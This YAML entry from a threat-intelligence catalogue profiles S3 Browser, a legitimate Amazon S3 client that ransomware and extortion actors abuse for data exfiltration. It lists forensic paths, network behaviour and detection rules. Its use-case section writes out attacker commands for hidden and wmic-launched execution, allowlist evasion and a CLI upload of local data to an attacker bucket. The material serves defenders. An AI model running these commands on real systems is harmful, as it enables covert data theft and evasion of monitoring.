Name: S3 Browser
Description: >
  S3 Browser is a legitimate Windows GUI and CLI client for Amazon S3, enabling users to upload,
  download, and manage objects in cloud storage. While intended for administrative use, it has
  been abused by ransomware and extortion actors for data exfiltration, leveraging trusted
  HTTPS connections to AWS S3. Threat actors commonly deploy portable copies from non-standard
  paths or invoke the CLI variant via scripts to perform stealthy, large-scale uploads.
Category: cloud-based
Platform:
  - Windows
Execution:
  - gui
  - cli
Capabilities:
  - cloud-sync               # Supports syncing files with S3 buckets through GUI or CLI.
  - encrypted-transfer       # Uses HTTPS and AWS SigV4 for secure data transfer to Amazon S3.
  - silent-execution         # Can be executed hidden or non-interactively via PowerShell or batch files.
  - credentialed-upload      # Requires AWS access keys or session tokens, often hardcoded or preloaded.
  - portable-execution       # Frequently executed from user-writable paths to evade application controls.
Forensics:
  BinaryLocations:
    - C:\Program Files (x86)\S3 Browser\s3browser-ui.exe
    - C:\Program Files\S3 Browser\s3browser-ui.exe
    - C:\Program Files (x86)\S3 Browser\s3browser-cli.exe
    - APPDATA\S3Tools\s3browser-ui.exe
    - TEMP\S3Browser\s3browser-ui.exe
    - PUBLIC\Tools\S3Browser\s3browser-ui.exe
  FileNamePatterns:
    - s3browser-ui.exe
    - s3browser-cli.exe
    - s3browser.exe
  LogFiles:
    - C:\Users\<user>\AppData\Roaming\S3Browser\logs\
    - TEMP\s3browser.log
  CommandLineArgs:
    - /file upload              # Uploads a file or directory to an S3 bucket.
    - /account add              # Adds or configures AWS credentials for uploads.
    - /license                  # Observed in self-extracting droppers and cracked distributions.
  ConfigFiles:
    - C:\Users\<user>\AppData\Roaming\S3Browser\s3browser.settings.v4
  ScheduledTask: []
  RegistryPersistence: []
  NetworkArtifacts:
    Description: >
      S3 Browser communicates with Amazon S3 using standard AWS APIs over HTTPS.
      Network destinations, bucket names, and regions are fully operator-controlled,
      making static network indicators unreliable for rule-based detection.
    Indicators: []
NetworkBehavior:
  Description: >
    S3 Browser performs authenticated HTTPS sessions to AWS S3 endpoints, typically
    initiating sustained outbound transfers following local directory enumeration.
    In malicious use, uploads often occur from user endpoints, non-backup systems,
    or at unusual times, and may involve bulk transfers immediately after staging
    or archive creation.
  Behaviors:
    - authenticated HTTPS sessions using AWS SigV4
    - sustained high bytes_out to a single cloud destination
    - bulk uploads following local file enumeration
    - execution from user-writable paths rather than installed locations
    - optional CLI-driven transfers without GUI interaction
ThreatActors:
  - ransomware
  - apt
UseCases:
  - Title: Standard GUI Upload
    Description: >
      Manual file uploads using the S3 Browser interface. Threat actors may abuse this
      capability on compromised systems with interactive access.
    Command: |
      "C:\Program Files\S3 Browser\s3browser-ui.exe"
  - Title: Post-Exploitation Portable Execution
    Description: >
      Attacker copies S3 Browser binaries to a user-writable directory and executes them
      to bypass application allowlisting or monitoring tied to Program Files.
    Command: |
      Start-Process "$env:APPDATA\S3Tools\s3browser-ui.exe"
  - Title: Hidden Execution via PowerShell
    Description: >
      S3 Browser is launched with a hidden window to reduce user visibility during exfiltration.
    Command: |
      Start-Process "$env:APPDATA\S3Tools\s3browser-ui.exe" -WindowStyle Hidden
  - Title: CLI-Based Exfiltration
    Description: >
      Uses the S3 Browser CLI to script uploads to attacker-controlled S3 buckets using
      embedded or preloaded AWS credentials.
    Command: |
      s3browser-cli.exe /account add 0 "exfil-profile" access-key-id=<AKIA...> secret-access-key=<secret>
      s3browser-cli.exe /file upload "exfil-profile" C:\Temp\data s3://bucket/path
  - Title: LOLBIN-Assisted Launch
    Description: >
      S3 Browser executed via Windows management utilities to obscure the process chain.
    Command: |
      wmic process call create "$env:APPDATA\S3Tools\s3browser-ui.exe"
Detection:
  - Type: Execution from Non-Standard Path
    Description: >
      Detect S3 Browser binaries executed from user-writable locations such as `%APPDATA%`,
      `%TEMP%`, or `%PUBLIC%`, especially on systems not used for cloud administration.
  - Type: Suspicious Parent Process
    Description: >
      Alert when S3 Browser is launched by scripting engines or LOLBINs such as
      `powershell.exe`, `wmic.exe`, or `cmd.exe`.
  - Type: Cloud Upload from User Endpoint
    Description: >
      Correlate S3 Browser execution with large outbound HTTPS transfers from workstations
      or servers that do not normally perform backups or S3 administration.
  - Type: CLI Upload Abuse
    Description: >
      Detect command-line usage of `s3browser-cli.exe` with `/file upload` or `/account add`,
      indicating scripted or stealthy exfiltration.
References:
  - https://unit42.paloaltonetworks.com/large-scale-cloud-extortion-operation/
  - https://unit42.paloaltonetworks.com/shinyhunters-ransomware-extortion/
